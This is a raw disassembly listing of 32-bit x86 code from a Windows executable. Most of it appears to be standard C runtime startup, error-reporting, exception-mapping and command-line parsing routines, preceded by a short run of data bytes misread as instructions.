  424361:	adc    eax,0xd666505c
  424366:	loop   0x424372
  424368:	fdivr  QWORD PTR [ebp-0x61]
  42436b:	xchg   edi,eax
  42436c:	cmc    
  42436d:	add    bh,bl
  42436f:	test   al,cl
  424371:	mov    ah,0x69
  424373:	cs cmp eax,0x5dd4c758
  424379:	fsubr  st,st(1)
  42437b:	pop    ebx
  42437c:	pop    esi
  42437d:	sub    cl,BYTE PTR [eax]
  42437f:	dec    esi
  424380:	pop    es
  424381:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424382:	pusha  
  424383:	mov    ebx,DWORD PTR [eax+ebx*8+0x1a]
  424387:	push   esp
  424388:	mov    ecx,0x345d4332
  42438d:	test   edi,eax
  42438f:	in     al,dx
  424390:	mov    eax,DWORD PTR [ecx+0x0]
  424393:	scas   al,BYTE PTR es:[edi]
  424394:	xor    al,0x43
  424396:	xchg   BYTE PTR [edi+0x557c1983],bl
  42439c:	stc    
  42439d:	adc    DWORD PTR [edi+ebp*4],ebp
  4243a0:	push   esi
  4243a1:	les    edi,FWORD PTR [ecx+eiz*2+0x307682f9]
  4243a8:	das    
  4243a9:	mov    esp,0x96ae6e82
  4243ae:	dec    cl
  4243b0:	push   es
  4243b1:	inc    esi
  4243b2:	adc    bl,BYTE PTR [esi+0x59cb72c2]
  4243b8:	pop    ecx
  4243b9:	stos   DWORD PTR es:[edi],eax
  4243ba:	fcmovnb st,st(4)
  4243bc:	xchg   ebx,eax
  4243bd:	push   0x5a
  4243bf:	push   0x556e8e7
  4243c4:	mov    BYTE PTR [edx-0x59],dh
  4243c7:	stc    
  4243c8:	arpl   WORD PTR [edi],di
  4243ca:	cmc    
  4243cb:	cmc    
  4243cc:	or     eax,0xc785ba7e
  4243d1:	shr    DWORD PTR [ebp-0x4420ed8d],cl
  4243d7:	mov    ebp,esp
  4243d9:	data16 div BYTE PTR [ecx-0x6e]
  4243dd:	test   al,0x7
  4243df:	pop    ecx
  4243e0:	imul   esi,DWORD PTR [eax],0xffffffe5
  4243e3:	cmc    
  4243e4:	push   eax
  4243e5:	cmp    bl,BYTE PTR [edx+ebx*4]
  4243e8:	xchg   esp,eax
  4243e9:	mov    esp,0xee4f5a19
  4243ee:	fst    DWORD PTR [ebp-0x75]
  4243f1:	mov    edx,DWORD PTR [edi+0x265dd97d]
  4243f7:	repz inc esp
  4243f9:	cmp    BYTE PTR ds:0x6a7e8e88,dl
  4243ff:	add    BYTE PTR [edx+0x0],ch
  424402:	call   0x424410
  424407:	xor    eax,eax
  424409:	add    esp,0x10
  42440c:	ret    0x10
  42440f:	nop
  424410:	jmp    DWORD PTR ds:0x429114
  424416:	cmp    DWORD PTR ds:0x45dabc,0x1
  42441d:	jne    0x424424
  42441f:	call   0x424962
  424424:	push   DWORD PTR [esp+0x4]
  424428:	call   0x4247eb
  42442d:	push   0xff
  424432:	call   DWORD PTR ds:0x45d1c0
  424438:	pop    ecx
  424439:	pop    ecx
  42443a:	ret    
  42443b:	cmp    DWORD PTR ds:0x45dabc,0x1
  424442:	jne    0x424449
  424444:	call   0x424962
  424449:	push   DWORD PTR [esp+0x4]
  42444d:	call   0x4247eb
  424452:	push   0xff
  424457:	call   0x424631
  42445c:	pop    ecx
  42445d:	pop    ecx
  42445e:	ret    
  42445f:	push   0x60
  424461:	push   0x429228
  424466:	call   0x425350
  42446b:	mov    edi,0x94
  424470:	mov    eax,edi
  424472:	call   0x4253a0
  424477:	mov    DWORD PTR [ebp-0x18],esp
  42447a:	mov    esi,esp
  42447c:	mov    DWORD PTR [esi],edi
  42447e:	push   esi
  42447f:	call   DWORD PTR ds:0x429058
  424485:	mov    ecx,DWORD PTR [esi+0x10]
  424488:	mov    DWORD PTR ds:0x45dac4,ecx
  42448e:	mov    eax,DWORD PTR [esi+0x4]
  424491:	mov    ds:0x45dad0,eax
  424496:	mov    edx,DWORD PTR [esi+0x8]
  424499:	mov    DWORD PTR ds:0x45dad4,edx
  42449f:	mov    esi,DWORD PTR [esi+0xc]
  4244a2:	and    esi,0x7fff
  4244a8:	mov    DWORD PTR ds:0x45dac8,esi
  4244ae:	cmp    ecx,0x2
  4244b1:	je     0x4244bf
  4244b3:	or     esi,0x8000
  4244b9:	mov    DWORD PTR ds:0x45dac8,esi
  4244bf:	shl    eax,0x8
  4244c2:	add    eax,edx
  4244c4:	mov    ds:0x45dacc,eax
  4244c9:	xor    esi,esi
  4244cb:	push   esi
  4244cc:	mov    edi,DWORD PTR ds:0x429024
  4244d2:	call   edi
  4244d4:	cmp    WORD PTR [eax],0x5a4d
  4244d9:	jne    0x4244fa
  4244db:	mov    ecx,DWORD PTR [eax+0x3c]
  4244de:	add    ecx,eax
  4244e0:	cmp    DWORD PTR [ecx],0x4550
  4244e6:	jne    0x4244fa
  4244e8:	movzx  eax,WORD PTR [ecx+0x18]
  4244ec:	cmp    eax,0x10b
  4244f1:	je     0x424512
  4244f3:	cmp    eax,0x20b
  4244f8:	je     0x4244ff
  4244fa:	mov    DWORD PTR [ebp-0x1c],esi
  4244fd:	jmp    0x424526
  4244ff:	cmp    DWORD PTR [ecx+0x84],0xe
  424506:	jbe    0x4244fa
  424508:	xor    eax,eax
  42450a:	cmp    DWORD PTR [ecx+0xf8],esi
  424510:	jmp    0x424520
  424512:	cmp    DWORD PTR [ecx+0x74],0xe
  424516:	jbe    0x4244fa
  424518:	xor    eax,eax
  42451a:	cmp    DWORD PTR [ecx+0xe8],esi
  424520:	setne  al
  424523:	mov    DWORD PTR [ebp-0x1c],eax
  424526:	push   0x1
  424528:	call   0x4252fd
  42452d:	pop    ecx
  42452e:	test   eax,eax
  424530:	jne    0x42453a
  424532:	push   0x1c
  424534:	call   0x42443b
  424539:	pop    ecx
  42453a:	call   0x425274
  42453f:	test   eax,eax
  424541:	jne    0x42454b
  424543:	push   0x10
  424545:	call   0x42443b
  42454a:	pop    ecx
  42454b:	call   0x42515d
  424550:	mov    DWORD PTR [ebp-0x4],esi
  424553:	call   0x424f5f
  424558:	test   eax,eax
  42455a:	jge    0x424564
  42455c:	push   0x1b
  42455e:	call   0x424416
  424563:	pop    ecx
  424564:	call   DWORD PTR ds:0x429054
  42456a:	mov    ds:0x45e274,eax
  42456f:	call   0x424e3d
  424574:	mov    ds:0x45dab4,eax
  424579:	call   0x424d9b
  42457e:	test   eax,eax
  424580:	jge    0x42458a
  424582:	push   0x8
  424584:	call   0x424416
  424589:	pop    ecx
  42458a:	call   0x424b68
  42458f:	test   eax,eax
  424591:	jge    0x42459b
  424593:	push   0x9
  424595:	call   0x424416
  42459a:	pop    ecx
  42459b:	call   0x424673
  4245a0:	mov    DWORD PTR [ebp-0x20],eax
  4245a3:	cmp    eax,esi
  4245a5:	je     0x4245ae
  4245a7:	push   eax
  4245a8:	call   0x424416
  4245ad:	pop    ecx
  4245ae:	mov    DWORD PTR [ebp-0x38],esi
  4245b1:	lea    eax,[ebp-0x64]
  4245b4:	push   eax
  4245b5:	call   DWORD PTR ds:0x429050
  4245bb:	call   0x424aff
  4245c0:	mov    DWORD PTR [ebp-0x68],eax
  4245c3:	test   BYTE PTR [ebp-0x38],0x1
  4245c7:	je     0x4245cf
  4245c9:	movzx  eax,WORD PTR [ebp-0x34]
  4245cd:	jmp    0x4245d2
  4245cf:	push   0xa
  4245d1:	pop    eax
  4245d2:	push   eax
  4245d3:	push   DWORD PTR [ebp-0x68]
  4245d6:	push   esi
  4245d7:	push   esi
  4245d8:	call   edi
  4245da:	push   eax
  4245db:	call   0x422f90
  4245e0:	mov    edi,eax
  4245e2:	mov    DWORD PTR [ebp-0x6c],edi
  4245e5:	cmp    DWORD PTR [ebp-0x1c],esi
  4245e8:	jne    0x4245f0
  4245ea:	push   edi
  4245eb:	call   0x4247ab
  4245f0:	call   0x4247cd
  4245f5:	jmp    0x424622
  4245f7:	mov    eax,DWORD PTR [ebp-0x14]
  4245fa:	mov    ecx,DWORD PTR [eax]
  4245fc:	mov    ecx,DWORD PTR [ecx]
  4245fe:	mov    DWORD PTR [ebp-0x70],ecx
  424601:	push   eax
  424602:	push   ecx
  424603:	call   0x42499b
  424608:	pop    ecx
  424609:	pop    ecx
  42460a:	ret    
  42460b:	mov    esp,DWORD PTR [ebp-0x18]
  42460e:	mov    edi,DWORD PTR [ebp-0x70]
  424611:	cmp    DWORD PTR [ebp-0x1c],0x0
  424615:	jne    0x42461d
  424617:	push   edi
  424618:	call   0x4247bc
  42461d:	call   0x4247dc
  424622:	or     DWORD PTR [ebp-0x4],0xffffffff
  424626:	mov    eax,edi
  424628:	lea    esp,[ebp-0x7c]
  42462b:	call   0x42538b
  424630:	ret    
  424631:	push   0x429244
  424636:	call   DWORD PTR ds:0x429024
  42463c:	test   eax,eax
  42463e:	je     0x424656
  424640:	push   0x429234
  424645:	push   eax
  424646:	call   DWORD PTR ds:0x429020
  42464c:	test   eax,eax
  42464e:	je     0x424656
  424650:	push   DWORD PTR [esp+0x4]
  424654:	call   eax
  424656:	push   DWORD PTR [esp+0x4]
  42465a:	call   DWORD PTR ds:0x42905c
  424660:	int3   
  424661:	push   0x8
  424663:	call   0x42550f
  424668:	pop    ecx
  424669:	ret    
  42466a:	push   0x8
  42466c:	call   0x42547b
  424671:	pop    ecx
  424672:	ret    
  424673:	mov    eax,ds:0x45e270
  424678:	test   eax,eax
  42467a:	je     0x42467e
  42467c:	call   eax
  42467e:	push   esi
  42467f:	push   edi
  424680:	mov    ecx,0x42b00c
  424685:	mov    edi,0x42b018
  42468a:	xor    eax,eax
  42468c:	cmp    ecx,edi
  42468e:	mov    esi,ecx
  424690:	jae    0x4246a9
  424692:	test   eax,eax
  424694:	jne    0x4246d5
  424696:	mov    ecx,DWORD PTR [esi]
  424698:	test   ecx,ecx
  42469a:	je     0x42469e
  42469c:	call   ecx
  42469e:	add    esi,0x4
  4246a1:	cmp    esi,edi
  4246a3:	jb     0x424692
  4246a5:	test   eax,eax
  4246a7:	jne    0x4246d5
  4246a9:	push   0x4251a1
  4246ae:	call   0x425620
  4246b3:	mov    esi,0x42b000
  4246b8:	mov    eax,esi
  4246ba:	mov    edi,0x42b008
  4246bf:	cmp    eax,edi
  4246c1:	pop    ecx
  4246c2:	jae    0x4246d3
  4246c4:	mov    eax,DWORD PTR [esi]
  4246c6:	test   eax,eax
  4246c8:	je     0x4246cc
  4246ca:	call   eax
  4246cc:	add    esi,0x4
  4246cf:	cmp    esi,edi
  4246d1:	jb     0x4246c4
  4246d3:	xor    eax,eax
  4246d5:	pop    edi
  4246d6:	pop    esi
  4246d7:	ret    
  4246d8:	push   ebp
  4246d9:	mov    ebp,esp
  4246db:	push   esi
  4246dc:	push   edi
  4246dd:	push   0x8
  4246df:	call   0x42550f
  4246e4:	xor    esi,esi
  4246e6:	inc    esi
  4246e7:	cmp    DWORD PTR ds:0x45db04,esi
  4246ed:	pop    ecx
  4246ee:	jne    0x424700
  4246f0:	push   DWORD PTR [ebp+0x8]
  4246f3:	call   DWORD PTR ds:0x429064
  4246f9:	push   eax
  4246fa:	call   DWORD PTR ds:0x429060
  424700:	cmp    DWORD PTR [ebp+0xc],0x0
  424704:	mov    al,BYTE PTR [ebp+0x10]
  424707:	mov    DWORD PTR ds:0x45db00,esi
  42470d:	mov    ds:0x45dafc,al
  424712:	jne    0x424766
  424714:	mov    ecx,DWORD PTR ds:0x45e268
  42471a:	test   ecx,ecx
  42471c:	je     0x424747
  42471e:	mov    eax,ds:0x45e264
  424723:	sub    eax,0x4
  424726:	cmp    eax,ecx
  424728:	jmp    0x424740
  42472a:	mov    eax,DWORD PTR [eax]
  42472c:	test   eax,eax
  42472e:	je     0x424732
  424730:	call   eax
  424732:	mov    eax,ds:0x45e264
  424737:	sub    eax,0x4
  42473a:	cmp    eax,DWORD PTR ds:0x45e268
  424740:	mov    ds:0x45e264,eax
  424745:	jae    0x42472a
  424747:	mov    eax,0x42b01c
  42474c:	mov    esi,0x42b020
  424751:	cmp    eax,esi
  424753:	mov    edi,eax
  424755:	jae    0x424766
  424757:	mov    eax,DWORD PTR [edi]
  424759:	test   eax,eax
  42475b:	je     0x42475f
  42475d:	call   eax
  42475f:	add    edi,0x4
  424762:	cmp    edi,esi
  424764:	jb     0x424757
  424766:	mov    eax,0x42b024
  42476b:	mov    esi,0x42b028
  424770:	cmp    eax,esi
  424772:	mov    edi,eax
  424774:	jae    0x424785
  424776:	mov    eax,DWORD PTR [edi]
  424778:	test   eax,eax
  42477a:	je     0x42477e
  42477c:	call   eax
  42477e:	add    edi,0x4
  424781:	cmp    edi,esi
  424783:	jb     0x424776
  424785:	cmp    DWORD PTR [ebp+0x10],0x0
  424789:	pop    edi
  42478a:	pop    esi
  42478b:	je     0x424796
  42478d:	push   0x8
  42478f:	call   0x42547b
  424794:	jmp    0x4247a8
  424796:	push   DWORD PTR [ebp+0x8]
  424799:	mov    DWORD PTR ds:0x45db04,0x1
  4247a3:	call   0x424631
  4247a8:	pop    ecx
  4247a9:	pop    ebp
  4247aa:	ret    
  4247ab:	push   0x0
  4247ad:	push   0x0
  4247af:	push   DWORD PTR [esp+0xc]
  4247b3:	call   0x4246d8
  4247b8:	add    esp,0xc
  4247bb:	ret    
  4247bc:	push   0x0
  4247be:	push   0x1
  4247c0:	push   DWORD PTR [esp+0xc]
  4247c4:	call   0x4246d8
  4247c9:	add    esp,0xc
  4247cc:	ret    
  4247cd:	push   0x1
  4247cf:	push   0x0
  4247d1:	push   0x0
  4247d3:	call   0x4246d8
  4247d8:	add    esp,0xc
  4247db:	ret    
  4247dc:	push   0x1
  4247de:	push   0x1
  4247e0:	push   0x0
  4247e2:	call   0x4246d8
  4247e7:	add    esp,0xc
  4247ea:	ret    
  4247eb:	push   ebp
  4247ec:	mov    ebp,esp
  4247ee:	sub    esp,0x10c
  4247f4:	mov    eax,ds:0x45d430
  4247f9:	xor    eax,DWORD PTR [ebp+0x4]
  4247fc:	mov    ecx,DWORD PTR [ebp+0x8]
  4247ff:	push   ebx
  424800:	push   esi
  424801:	mov    DWORD PTR [ebp-0x4],eax
  424804:	xor    edx,edx
  424806:	push   edi
  424807:	xor    eax,eax
  424809:	cmp    ecx,DWORD PTR [eax*8+0x45d1c8]
  424810:	je     0x424818
  424812:	inc    eax
  424813:	cmp    eax,0x12
  424816:	jb     0x424809
  424818:	mov    esi,eax
  42481a:	shl    esi,0x3
  42481d:	cmp    ecx,DWORD PTR [esi+0x45d1c8]
  424823:	jne    0x42494c
  424829:	mov    eax,ds:0x45dabc
  42482e:	cmp    eax,0x1
  424831:	je     0x424927
  424837:	cmp    eax,edx
  424839:	jne    0x424848
  42483b:	cmp    DWORD PTR ds:0x45d1c4,0x1
  424842:	je     0x424927
  424848:	cmp    ecx,0xfc
  42484e:	je     0x42494c
  424854:	push   0x104
  424859:	lea    eax,[ebp-0x10c]
  42485f:	push   eax
  424860:	push   edx
  424861:	mov    BYTE PTR [ebp-0x8],dl
  424864:	call   DWORD PTR ds:0x42906c
  42486a:	test   eax,eax
  42486c:	jne    0x424881
  42486e:	lea    eax,[ebp-0x10c]
  424874:	push   0x42959c
  424879:	push   eax
  42487a:	call   0x425730
  42487f:	pop    ecx
  424880:	pop    ecx
  424881:	lea    eax,[ebp-0x10c]
  424887:	push   eax
  424888:	lea    edi,[ebp-0x10c]
  42488e:	call   0x425960
  424893:	inc    eax
  424894:	cmp    eax,0x3c
  424897:	pop    ecx
  424898:	jbe    0x4248c3
  42489a:	lea    eax,[ebp-0x10c]
  4248a0:	push   eax
  4248a1:	call   0x425960
  4248a6:	mov    edi,eax
  4248a8:	lea    eax,[ebp-0x10c]
  4248ae:	sub    eax,0x3b
  4248b1:	push   0x3
  4248b3:	add    edi,eax
  4248b5:	push   0x429598
  4248ba:	push   edi
  4248bb:	call   0x425830
  4248c0:	add    esp,0x10
  4248c3:	push   edi
  4248c4:	call   0x425960
  4248c9:	push   DWORD PTR [esi+0x45d1cc]
  4248cf:	mov    ebx,eax
  4248d1:	call   0x425960
  4248d6:	lea    eax,[ebx+eax*1+0x1c]
  4248da:	pop    ecx
  4248db:	add    eax,0x3
  4248de:	pop    ecx
  4248df:	and    eax,0xfffffffc
  4248e2:	call   0x4253a0
  4248e7:	mov    ebx,esp
  4248e9:	push   0x42957c
  4248ee:	push   ebx
  4248ef:	call   0x425730
  4248f4:	push   edi
  4248f5:	push   ebx
  4248f6:	call   0x425740
  4248fb:	push   0x429578
  424900:	push   ebx
  424901:	call   0x425740
  424906:	push   DWORD PTR [esi+0x45d1cc]
  42490c:	push   ebx
  42490d:	call   0x425740
  424912:	push   0x12010
  424917:	push   0x429550
  42491c:	push   ebx
  42491d:	call   0x425632
  424922:	add    esp,0x2c
  424925:	jmp    0x42494c
  424927:	push   edx
  424928:	lea    eax,[ebp+0x8]
  42492b:	push   eax
  42492c:	lea    esi,[esi+0x45d1cc]
  424932:	push   DWORD PTR [esi]
  424934:	call   0x425960
  424939:	pop    ecx
  42493a:	push   eax
  42493b:	push   DWORD PTR [esi]
  42493d:	push   0xfffffff4
  42493f:	call   DWORD PTR ds:0x429068
  424945:	push   eax
  424946:	call   DWORD PTR ds:0x42902c
  42494c:	lea    esp,[ebp-0x118]
  424952:	mov    ecx,DWORD PTR [ebp-0x4]
  424955:	xor    ecx,DWORD PTR [ebp+0x4]
  424958:	call   0x425a1c
  42495d:	pop    edi
  42495e:	pop    esi
  42495f:	pop    ebx
  424960:	leave  
  424961:	ret    
  424962:	mov    eax,ds:0x45dabc
  424967:	cmp    eax,0x1
  42496a:	je     0x424979
  42496c:	test   eax,eax
  42496e:	jne    0x42499a
  424970:	cmp    DWORD PTR ds:0x45d1c4,0x1
  424977:	jne    0x42499a
  424979:	push   0xfc
  42497e:	call   0x4247eb
  424983:	mov    eax,ds:0x45db08
  424988:	test   eax,eax
  42498a:	pop    ecx
  42498b:	je     0x42498f
  42498d:	call   eax
  42498f:	push   0xff
  424994:	call   0x4247eb
  424999:	pop    ecx
  42499a:	ret    
  42499b:	push   ebp
  42499c:	mov    ebp,esp
  42499e:	push   ecx
  42499f:	push   ebx
  4249a0:	push   esi
  4249a1:	push   edi
  4249a2:	call   0x425203
  4249a7:	mov    edi,DWORD PTR [ebp+0x8]
  4249aa:	mov    esi,eax
  4249ac:	mov    edx,DWORD PTR [esi+0x54]
  4249af:	mov    eax,ds:0x45d2dc
  4249b4:	mov    ecx,edx
  4249b6:	cmp    DWORD PTR [ecx],edi
  4249b8:	je     0x4249c7
  4249ba:	lea    ebx,[eax+eax*2]
  4249bd:	add    ecx,0xc
  4249c0:	lea    ebx,[edx+ebx*4]
  4249c3:	cmp    ecx,ebx
  4249c5:	jb     0x4249b6
  4249c7:	lea    eax,[eax+eax*2]
  4249ca:	lea    eax,[edx+eax*4]
  4249cd:	cmp    ecx,eax
  4249cf:	jae    0x4249d5
  4249d1:	cmp    DWORD PTR [ecx],edi
  4249d3:	je     0x4249d7
  4249d5:	xor    ecx,ecx
  4249d7:	test   ecx,ecx
  4249d9:	je     0x424af1
  4249df:	mov    ebx,DWORD PTR [ecx+0x8]
  4249e2:	test   ebx,ebx
  4249e4:	mov    DWORD PTR [ebp+0x8],ebx
  4249e7:	je     0x424af1
  4249ed:	cmp    ebx,0x5
  4249f0:	jne    0x4249fe
  4249f2:	and    DWORD PTR [ecx+0x8],0x0
  4249f6:	xor    eax,eax
  4249f8:	inc    eax
  4249f9:	jmp    0x424afa
  4249fe:	cmp    ebx,0x1
  424a01:	je     0x424aec
  424a07:	mov    eax,DWORD PTR [esi+0x58]
  424a0a:	mov    DWORD PTR [ebp-0x4],eax
  424a0d:	mov    eax,DWORD PTR [ebp+0xc]
  424a10:	mov    DWORD PTR [esi+0x58],eax
  424a13:	mov    eax,DWORD PTR [ecx+0x4]
  424a16:	cmp    eax,0x8
  424a19:	jne    0x424ade
  424a1f:	mov    edx,DWORD PTR ds:0x45d2d0
  424a25:	mov    eax,ds:0x45d2d4
  424a2a:	add    eax,edx
  424a2c:	cmp    edx,eax
  424a2e:	jge    0x424a57
  424a30:	lea    eax,[edx+edx*2]
  424a33:	shl    eax,0x2
  424a36:	mov    edi,DWORD PTR [esi+0x54]
  424a39:	and    DWORD PTR [eax+edi*1+0x8],0x0
  424a3e:	mov    edi,DWORD PTR ds:0x45d2d0
  424a44:	mov    ebx,DWORD PTR ds:0x45d2d4
  424a4a:	inc    edx
  424a4b:	add    ebx,edi
  424a4d:	add    eax,0xc
  424a50:	cmp    edx,ebx
  424a52:	jl     0x424a36
  424a54:	mov    ebx,DWORD PTR [ebp+0x8]
  424a57:	mov    ecx,DWORD PTR [ecx]
  424a59:	cmp    ecx,0xc000008e
  424a5f:	mov    edi,DWORD PTR [esi+0x5c]
  424a62:	jne    0x424a6d
  424a64:	mov    DWORD PTR [esi+0x5c],0x83
  424a6b:	jmp    0x424ad1
  424a6d:	cmp    ecx,0xc0000090
  424a73:	jne    0x424a7e
  424a75:	mov    DWORD PTR [esi+0x5c],0x81
  424a7c:	jmp    0x424ad1
  424a7e:	cmp    ecx,0xc0000091
  424a84:	jne    0x424a8f
  424a86:	mov    DWORD PTR [esi+0x5c],0x84
  424a8d:	jmp    0x424ad1
  424a8f:	cmp    ecx,0xc0000093
  424a95:	jne    0x424aa0
  424a97:	mov    DWORD PTR [esi+0x5c],0x85
  424a9e:	jmp    0x424ad1
  424aa0:	cmp    ecx,0xc000008d
  424aa6:	jne    0x424ab1
  424aa8:	mov    DWORD PTR [esi+0x5c],0x82
  424aaf:	jmp    0x424ad1
  424ab1:	cmp    ecx,0xc000008f
  424ab7:	jne    0x424ac2
  424ab9:	mov    DWORD PTR [esi+0x5c],0x86
  424ac0:	jmp    0x424ad1
  424ac2:	cmp    ecx,0xc0000092
  424ac8:	jne    0x424ad1
  424aca:	mov    DWORD PTR [esi+0x5c],0x8a
  424ad1:	push   DWORD PTR [esi+0x5c]
  424ad4:	push   0x8
  424ad6:	call   ebx
  424ad8:	pop    ecx
  424ad9:	mov    DWORD PTR [esi+0x5c],edi
  424adc:	jmp    0x424ae5
  424ade:	and    DWORD PTR [ecx+0x8],0x0
  424ae2:	push   eax
  424ae3:	call   ebx
  424ae5:	mov    eax,DWORD PTR [ebp-0x4]
  424ae8:	pop    ecx
  424ae9:	mov    DWORD PTR [esi+0x58],eax
  424aec:	or     eax,0xffffffff
  424aef:	jmp    0x424afa
  424af1:	push   DWORD PTR [ebp+0xc]
  424af4:	call   DWORD PTR ds:0x429070
  424afa:	pop    edi
  424afb:	pop    esi
  424afc:	pop    ebx
  424afd:	leave  
  424afe:	ret    
  424aff:	cmp    DWORD PTR ds:0x45e26c,0x0
  424b06:	jne    0x424b0d
  424b08:	call   0x425f3c
  424b0d:	push   esi
  424b0e:	mov    esi,DWORD PTR ds:0x45e274
  424b14:	test   esi,esi
  424b16:	jne    0x424b1f
  424b18:	mov    esi,0x4295b3
  424b1d:	jmp    0x424b64
  424b1f:	mov    al,BYTE PTR [esi]
  424b21:	cmp    al,0x22
  424b23:	jne    0x424b4d
  424b25:	inc    esi
  424b26:	mov    al,BYTE PTR [esi]
  424b28:	cmp    al,0x22
  424b2a:	je     0x424b5d
  424b2c:	test   al,al
  424b2e:	je     0x424b46
  424b30:	movzx  eax,al
  424b33:	push   eax
  424b34:	call   0x425a5b
  424b39:	test   eax,eax
  424b3b:	pop    ecx
  424b3c:	je     0x424b3f
  424b3e:	inc    esi
  424b3f:	inc    esi
  424b40:	mov    al,BYTE PTR [esi]
  424b42:	cmp    al,0x22
  424b44:	jne    0x424b2c
  424b46:	cmp    BYTE PTR [esi],0x22
  424b49:	jne    0x424b5e
  424b4b:	jmp    0x424b5d
  424b4d:	cmp    al,0x20
  424b4f:	jbe    0x424b5e
  424b51:	inc    esi
  424b52:	cmp    BYTE PTR [esi],0x20
  424b55:	ja     0x424b51
  424b57:	jmp    0x424b5e
  424b59:	cmp    al,0x20
  424b5b:	ja     0x424b64
  424b5d:	inc    esi
  424b5e:	mov    al,BYTE PTR [esi]
  424b60:	test   al,al
  424b62:	jne    0x424b59
  424b64:	mov    eax,esi
  424b66:	pop    esi
  424b67:	ret    
  424b68:	push   ebx
  424b69:	xor    ebx,ebx
  424b6b:	cmp    DWORD PTR ds:0x45e26c,ebx
  424b71:	push   esi
  424b72:	push   edi
  424b73:	jne    0x424b7a
  424b75:	call   0x425f3c
  424b7a:	mov    esi,DWORD PTR ds:0x45dab4
  424b80:	xor    edi,edi
  424b82:	cmp    esi,ebx
  424b84:	jne    0x424b98
  424b86:	jmp    0x424bb8
  424b88:	cmp    al,0x3d
  424b8a:	je     0x424b8d
  424b8c:	inc    edi
  424b8d:	push   esi
  424b8e:	call   0x425960
  424b93:	pop    ecx
  424b94:	lea    esi,[esi+eax*1+0x1]
  424b98:	mov    al,BYTE PTR [esi]
  424b9a:	cmp    al,bl
  424b9c:	jne    0x424b88
  424b9e:	lea    eax,[edi*4+0x4]
  424ba5:	push   eax
  424ba6:	call   0x426072
  424bab:	mov    edi,eax
  424bad:	cmp    edi,ebx
  424baf:	pop    ecx
  424bb0:	mov    DWORD PTR ds:0x45dae4,edi
  424bb6:	jne    0x424bbd
  424bb8:	or     eax,0xffffffff
  424bbb:	jmp    0x424c15
  424bbd:	mov    esi,DWORD PTR ds:0x45dab4
  424bc3:	push   ebp
  424bc4:	jmp    0x424bf0
  424bc6:	push   esi
  424bc7:	call   0x425960
  424bcc:	mov    ebp,eax
  424bce:	inc    ebp
  424bcf:	cmp    BYTE PTR [esi],0x3d
  424bd2:	pop    ecx
  424bd3:	je     0x424bee
  424bd5:	push   ebp
  424bd6:	call   0x426072
  424bdb:	cmp    eax,ebx
  424bdd:	pop    ecx
  424bde:	mov    DWORD PTR [edi],eax
  424be0:	je     0x424c19
  424be2:	push   esi
  424be3:	push   eax
  424be4:	call   0x425730
  424be9:	pop    ecx
  424bea:	pop    ecx
  424beb:	add    edi,0x4
  424bee:	add    esi,ebp
  424bf0:	cmp    BYTE PTR [esi],bl
  424bf2:	jne    0x424bc6
  424bf4:	push   DWORD PTR ds:0x45dab4
  424bfa:	call   0x425f5a
  424bff:	mov    DWORD PTR ds:0x45dab4,ebx
  424c05:	mov    DWORD PTR [edi],ebx
  424c07:	mov    DWORD PTR ds:0x45e260,0x1
  424c11:	xor    eax,eax
  424c13:	pop    ecx
  424c14:	pop    ebp
  424c15:	pop    edi
  424c16:	pop    esi
  424c17:	pop    ebx
  424c18:	ret    
  424c19:	push   DWORD PTR ds:0x45dae4
  424c1f:	call   0x425f5a
  424c24:	mov    DWORD PTR ds:0x45dae4,ebx
  424c2a:	or     eax,0xffffffff
  424c2d:	jmp    0x424c13
  424c2f:	push   ebp
  424c30:	mov    ebp,esp
  424c32:	push   ecx
  424c33:	push   ebx
  424c34:	mov    ebx,DWORD PTR [ebp+0xc]
  424c37:	xor    edx,edx
  424c39:	cmp    DWORD PTR [ebp+0x8],edx
  424c3c:	push   edi
  424c3d:	mov    DWORD PTR [esi],edx
  424c3f:	mov    edi,ecx
  424c41:	mov    DWORD PTR [ebx],0x1
  424c47:	je     0x424c52
  424c49:	mov    ecx,DWORD PTR [ebp+0x8]
  424c4c:	add    DWORD PTR [ebp+0x8],0x4
  424c50:	mov    DWORD PTR [ecx],edi
  424c52:	cmp    BYTE PTR [eax],0x22
  424c55:	jne    0x424c65
  424c57:	xor    ecx,ecx
  424c59:	test   edx,edx
  424c5b:	sete   cl
  424c5e:	inc    eax
  424c5f:	mov    edx,ecx
  424c61:	mov    cl,0x22
  424c63:	jmp    0x424c92
  424c65:	inc    DWORD PTR [esi]
  424c67:	test   edi,edi
  424c69:	je     0x424c70
  424c6b:	mov    cl,BYTE PTR [eax]
  424c6d:	mov    BYTE PTR [edi],cl
  424c6f:	inc    edi
  424c70:	mov    cl,BYTE PTR [eax]
  424c72:	movzx  ebx,cl
  424c75:	inc    eax
  424c76:	test   BYTE PTR [ebx+0x45df21],0x4
  424c7d:	je     0x424c8b
  424c7f:	inc    DWORD PTR [esi]
  424c81:	test   edi,edi
  424c83:	je     0x424c8a
  424c85:	mov    bl,BYTE PTR [eax]
  424c87:	mov    BYTE PTR [edi],bl
  424c89:	inc    edi
  424c8a:	inc    eax
  424c8b:	test   cl,cl
  424c8d:	mov    ebx,DWORD PTR [ebp+0xc]
  424c90:	je     0x424cc4
  424c92:	test   edx,edx
  424c94:	jne    0x424c52
  424c96:	cmp    cl,0x20
  424c99:	je     0x424ca0
  424c9b:	cmp    cl,0x9
  424c9e:	jne    0x424c52
  424ca0:	test   edi,edi
  424ca2:	je     0x424ca8
  424ca4:	and    BYTE PTR [edi-0x1],0x0
  424ca8:	and    DWORD PTR [ebp-0x4],0x0
  424cac:	cmp    BYTE PTR [eax],0x0
  424caf:	je     0x424d8b
  424cb5:	mov    cl,BYTE PTR [eax]
  424cb7:	cmp    cl,0x20
  424cba:	je     0x424cc1
  424cbc:	cmp    cl,0x9
  424cbf:	jne    0x424cc7
  424cc1:	inc    eax
  424cc2:	jmp    0x424cb5
  424cc4:	dec    eax
  424cc5:	jmp    0x424ca8
  424cc7:	cmp    BYTE PTR [eax],0x0
  424cca:	je     0x424d8b
  424cd0:	cmp    DWORD PTR [ebp+0x8],0x0
  424cd4:	je     0x424cdf
  424cd6:	mov    ecx,DWORD PTR [ebp+0x8]
  424cd9:	add    DWORD PTR [ebp+0x8],0x4
  424cdd:	mov    DWORD PTR [ecx],edi
  424cdf:	inc    DWORD PTR [ebx]
  424ce1:	xor    ebx,ebx
  424ce3:	inc    ebx
  424ce4:	xor    edx,edx
  424ce6:	jmp    0x424cea
  424ce8:	inc    eax
  424ce9:	inc    edx
  424cea:	cmp    BYTE PTR [eax],0x5c
  424ced:	je     0x424ce8
  424cef:	cmp    BYTE PTR [eax],0x22
